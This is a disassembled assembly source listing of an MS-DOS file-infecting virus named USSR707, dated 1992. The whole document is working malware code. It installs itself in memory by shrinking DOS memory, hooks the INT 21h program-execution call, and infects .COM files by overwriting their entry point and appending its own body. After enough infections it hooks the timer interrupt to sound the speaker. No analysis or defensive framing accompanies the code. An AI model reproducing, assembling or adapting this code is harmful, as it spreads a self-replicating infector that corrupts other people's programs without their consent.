
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        USSR707				         €€
;€€								         €€
;€€      Created:   9-Feb-92					         €€
;€€      Passes:    5	       Analysis Options on: AW		         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e		equ	20h
data_2e		equ	22h
data_3e		equ	4Ch
data_4e		equ	4Eh
data_5e		equ	84h
data_6e		equ	86h
data_7e		equ	413h
data_8e		equ	1460h
data_9e		equ	3
data_10e	equ	2

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

ussr707		proc	far

start:
		mov	ax,offset loc_2
		push	ax
		retn
loc_2:
		jmp	short loc_3
		nop

ussr707		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		call	sub_3

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_3:
		pop	di
		sub	di,6
		retn
sub_2		endp

		db	 60h, 14h, 2Bh, 02h, 2Eh, 3Ah
		db	 26h,0FFh, 0Dh, 00h,0A0h, 00h
		db	 50h,0C3h, 01h, 2Eh,0A3h,0C0h
		db	 00h, 9Ch, 00h, 00h, 90h, 90h
		db	 90h,0CDh
		db	20h
loc_3:
		call	sub_2
		mov	ah,[di+21h]
		mov	byte ptr ds:[100h],ah
		mov	ax,[di+22h]
		mov	word ptr ds:[101h],ax
		mov	ax,[di+24h]
		mov	word ptr ds:[103h],ax
		mov	ah,30h			; '0'
		int	21h			; DOS Services  ah=function 30h
						;  get DOS version number ax
		cmp	ax,1E03h
		je	loc_4			; Jump if equal
		jmp	loc_9
loc_4:
		mov	bl,0
		mov	ax,4BFFh
		int	21h			; ??INT Non-standard interrupt
		cmp	bl,0FFh
		jne	loc_5			; Jump if not equal
		jmp	loc_9
loc_5:
		mov	ax,ds:data_10e
		mov	[di+14h],ax
		mov	bx,di
		add	bx,0Fh
		xor	ax,ax			; Zero register
		mov	es,ax
loc_6:
		xor	si,si			; Zero register
		mov	ax,es
		inc	ax
		cmp	ax,0FFFh
		jbe	loc_7			; Jump if below or =
		jmp	short loc_9
		nop
loc_7:
		mov	es,ax
loc_8:
		mov	ah,es:data_8e[si]
		cmp	ah,[bx+si]
		jne	loc_6			; Jump if not equal
		inc	si
		cmp	si,5
		jne	loc_8			; Jump if not equal
		mov	[di+0Dh],es
		mov	word ptr [di+1Fh],0
		mov	ax,cs
		dec	ax
		mov	es,ax
		call	sub_7
		sub	si,di
		mov	ax,si
		mov	cl,4
		shr	ax,cl			; Shift w/zeros fill
		inc	ax
		sub	es:data_9e,ax
		sub	ds:data_10e,ax
		mov	bx,[di+14h]
		sub	bx,ax
		mov	es,bx
		push	di
		call	sub_4
		xor	cx,cx			; Zero register
		mov	ds,cx
		mov	cl,6
		shr	ax,cl			; Shift w/zeros fill
		inc	ax
		sub	ds:data_7e,ax
		mov	ax,ds:data_5e
		mov	cs:[bx+0Bh],ax
		mov	ax,ds:data_6e
		mov	cs:[bx+0Dh],ax
		push	cs
		pop	ds
		mov	cx,si
		mov	si,di
		xor	di,di			; Zero register
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	di
		sub	bx,di
		add	bx,2
		xor	ax,ax			; Zero register
		mov	ds,ax
		cli				; Disable interrupts
		mov	ds:data_5e,bx
		mov	ds:data_6e,es
		sti				; Enable interrupts
loc_9:
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	ax,offset start
		push	ax
		retn

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		call	sub_5

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_5:
		pop	bx
		retn
sub_4		endp

		push	bx
		mov	bh,4Bh			; 'K'
		cmp	bh,ah
		je	loc_11			; Jump if equal
		pop	bx
loc_10:
;*		jmp	far ptr loc_1
		db	0EAh, 93h, 17h, 26h, 0Dh
loc_11:
		cmp	al,0FFh
		jne	loc_12			; Jump if not equal
		pop	bx
		mov	bl,0FFh
		iret				; Interrupt return
		pushf				; Push flags
;*		call	far ptr sub_1
		db	 9Ah, 00h, 00h, 00h, 00h
		push	ax
		in	al,61h			; port 61h, 8255 port B, read
		xor	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		mov	al,0B6h
		out	43h,al			; port 43h, 8253 wrt timr mode
		mov	ax,bx
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	al,ah
		out	42h,al			; port 42h, 8253 timer 2 spkr
		pop	ax
		iret				; Interrupt return
loc_12:
		push	ax
		push	cx
		push	dx
		push	di
		push	ds
		push	es
		mov	bx,dx
		xor	di,di			; Zero register
loc_13:
		inc	di
		cmp	byte ptr [bx+di],0
		jne	loc_13			; Jump if not equal
		cmp	word ptr [bx+di-2],4D4Fh
		je	loc_14			; Jump if equal
		jmp	loc_26
loc_14:
		cmp	byte ptr [bx+di-3],43h	; 'C'
		je	loc_15			; Jump if equal
		jmp	loc_26
loc_15:
		call	sub_2
		mov	bx,di
		add	bx,1Ah
		mov	ax,70h
		mov	es,ax
		xor	di,di			; Zero register
loc_16:
		inc	di
		cmp	di,0FFFFh
		jbe	loc_17			; Jump if below or =
		jmp	loc_26
loc_17:
		xor	si,si			; Zero register
loc_18:
		mov	ah,es:[di]
		cmp	ah,cs:[bx+si]
		jne	loc_16			; Jump if not equal
		inc	si
		inc	di
		cmp	si,5
		jne	loc_18			; Jump if not equal
		sub	di,5
		xor	ax,ax			; Zero register
		mov	es,ax
		push	word ptr es:data_3e
		push	word ptr es:data_4e
		cli				; Disable interrupts
		mov	es:data_3e,di
		mov	word ptr es:data_4e,70h
		sti				; Enable interrupts
		call	sub_2
		mov	bx,dx
		xor	cx,cx			; Zero register
		mov	ah,4Eh			; 'N'
		call	sub_6
		jnc	loc_19			; Jump if carry=0
		jmp	loc_25
loc_19:
		mov	ah,2Fh			; '/'
		call	sub_6
		mov	ax,es:[bx+1Ah]
		cmp	ax,0F000h
		jbe	loc_20			; Jump if below or =
		jmp	loc_25
loc_20:
		push	ds
		push	dx
		push	word ptr es:[bx+15h]
		push	word ptr es:[bx+16h]
		push	word ptr es:[bx+18h]
		add	ax,100h
		mov	cs:[di+18h],ax
		mov	ax,4301h
		mov	cx,20h
		call	sub_6
		mov	ax,3D02h
		call	sub_6
		jnc	loc_21			; Jump if carry=0
		jmp	short loc_24
		nop
loc_21:
		push	cs
		pop	ds
		mov	bx,ax
		mov	ah,3Fh			; '?'
		mov	cx,5
		mov	dx,di
		add	dx,21h
		call	sub_6
		mov	ax,[di+18h]
		sub	ax,[di+22h]
		cmp	ax,2C3h
		jne	loc_23			; Jump if not equal
		cmp	byte ptr [di+20h],1Eh
		jae	loc_22			; Jump if above or =
		inc	byte ptr [di+20h]
loc_22:
		jmp	short loc_24
		nop
loc_23:
		mov	byte ptr [di+17h],0B8h
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_6
		mov	ah,40h			; '@'
		mov	cx,3
		mov	dx,di
		add	dx,17h
		call	sub_6
		mov	ah,40h			; '@'
		mov	cx,2
		mov	word ptr [di+17h],0C350h
		call	sub_6
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_6
		mov	ah,40h			; '@'
		call	sub_7
		mov	cx,si
		sub	cx,di
		mov	dx,di
		call	sub_6
loc_24:
		mov	ax,5701h
		pop	dx
		pop	cx
		call	sub_6
		mov	ax,4301h
		pop	cx
		mov	ch,0
		pop	dx
		pop	ds
		call	sub_6
		mov	ah,3Eh			; '>'
		call	sub_6
loc_25:
		xor	ax,ax			; Zero register
		mov	es,ax
		cli				; Disable interrupts
		pop	word ptr es:data_4e
		pop	word ptr es:data_3e
		sti				; Enable interrupts
loc_26:
		call	sub_2
		cmp	byte ptr cs:[di+1Fh],0
		jne	loc_27			; Jump if not equal
		cmp	byte ptr cs:[di+20h],1Eh
		jb	loc_27			; Jump if below
		mov	byte ptr cs:[di+1Fh],1
		xor	ax,ax			; Zero register
		mov	es,ax
		call	sub_4
		add	bx,17h
		mov	ax,es:data_1e
		mov	cx,es:data_2e
		mov	cs:[bx+2],ax
		mov	cs:[bx+4],cx
		cli				; Disable interrupts
		mov	es:data_1e,bx
		mov	es:data_2e,cs
		sti				; Enable interrupts
loc_27:
		pop	es
		pop	ds
		pop	di
		pop	dx
		pop	cx
		pop	ax
		pop	bx
		jmp	loc_10

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6		proc	near
		pushf				; Push flags
		call	dword ptr cs:[di+0Bh]
		retn
sub_6		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_7		proc	near
		call	sub_8

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_8:
		pop	si
		add	si,5
		retn
sub_7		endp


seg_a		ends



		end	start
